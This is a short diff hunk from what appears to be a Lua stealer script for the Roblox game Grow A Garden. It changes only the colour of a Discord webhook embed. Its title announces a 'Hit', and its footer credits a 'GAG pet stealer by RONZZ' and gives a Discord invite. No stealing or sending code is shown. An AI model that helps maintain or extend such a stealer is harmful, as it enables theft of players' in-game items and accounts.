@@ -269,7 +269,7 @@ Account Age: %s days```
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = ":potted_plant: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
-            ["color"] = 0xFF0000, -- Red, change as you like
+            ["color"] = 25500, -- Red, change as you like
             ["description"] = description,
             ["footer"] = {
                 ["text"] = "GAG pet stealer by RONZZ. discord.gg/GY2RVSEGDT"
